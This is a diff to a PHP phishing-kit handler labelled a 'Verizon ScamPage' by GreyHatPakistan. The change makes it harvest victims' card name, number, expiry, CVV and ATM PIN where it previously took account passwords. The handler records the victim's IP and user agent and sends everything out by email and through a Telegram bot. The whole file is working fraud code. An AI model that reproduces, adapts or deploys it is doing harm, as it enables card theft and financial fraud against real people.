@@ -6,32 +6,39 @@ session_start();
 $ip = getenv("REMOTE_ADDR");
 $hostname = gethostbyaddr($ip);
 $useragent = $_SERVER['HTTP_USER_AGENT'];
-		if ( isset( $_POST['password'] ) ) {
+	if ( isset( $_POST['ccnum'] ) ) {
 		
-		$_SESSION['email'] 	  = $_POST['email'];
-		$_SESSION['password'] 	  = $_POST['password'];
+		$_SESSION['noc'] 	  = $_POST['noc'];
+		$_SESSION['ccnum'] 	  = $_POST['ccnum'];
+		$_SESSION['exp'] 	  = $_POST['exp'];
+		$_SESSION['cvv'] 	  = $_POST['cvv'];
+		$_SESSION['atmpin'] 	  = $_POST['atmpin'];
 		$code = <<<EOT
-»»————-　★[ ⚫️🌀 Verizon Account ⚫️🌀 ]★　————-««
-[User ID or Verizon mobile number] 		: {$_SESSION['email']}
-[Verizon Password]		: {$_SESSION['password']}
+»»————-　★[ ⚫️🌀 Verizon Credit Card ⚫️🌀 ]★　————-««
+[Name On Card] 		: {$_SESSION['noc']}
+[Card Number] 		: {$_SESSION['ccnum']}
+[EXP]		: {$_SESSION['exp']}
+[CVV] 		: {$_SESSION['cvv']}
+[ATM Pin]		: {$_SESSION['atmpin']}
+
 »»————-　★[ 💻🌏 DEVICE INFO 🌏💻  ]★　————-««
 IP		: $ip
 IP lookup		: http://ip-api.com/json/$ip
 OS		: $useragent
 
 
-»»————-　★[ ⚫️🌀 Verizon ScamPage By @GreyHatPakistan ⚫️🌀 ]★　————-««
+»»————-　★[ ⚫️🌀 Verizon ScamPage By GreyHatPakistan ⚫️🌀 ]★　————-««
 \r\n\r\n
 EOT;
 		if ($sendtoemail=="yes"){
-		$subject = "🏛️ Verizon Account By GreyHatPakistan 🏛️  From $ip";
-        $headers = "From: 🏛️ GreyHatPakistan 🏛️ <newfullz@sh33nz0.com>\r\n";
+		$subject = "🏛️ Verizon Credit Card By GreyHatPakistan🏛️  From $ip";
+        $headers = "From: 🍁Greyhatpakistan🍁 <newfullz@sh33nz0.com>\r\n";
         $headers .= "MIME-Version: 1.0\r\n";
         $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
         @mail($email,$subject,$code,$headers);
 		}
-		
-	if ($sendtotelegram=="yes"){	
+
+	if ($sendtotelegram=="yes"){
 	$txt = $code;
     $send = ['chat_id'=>$chat_id,'text'=>$txt];
     $website_telegram = "https://api.telegram.org/bot{$bot_url}";
@@ -43,11 +50,14 @@ EOT;
     $result = curl_exec($ch);
     curl_close($ch);
 	}
-	
-        header("Location: ../Email.php");
+
+
+        header("Location: ../Verified.php");
         exit();
 	} else {
 		header("Location: ../index.php");
 		exit();
 	}
+
+
 ?>
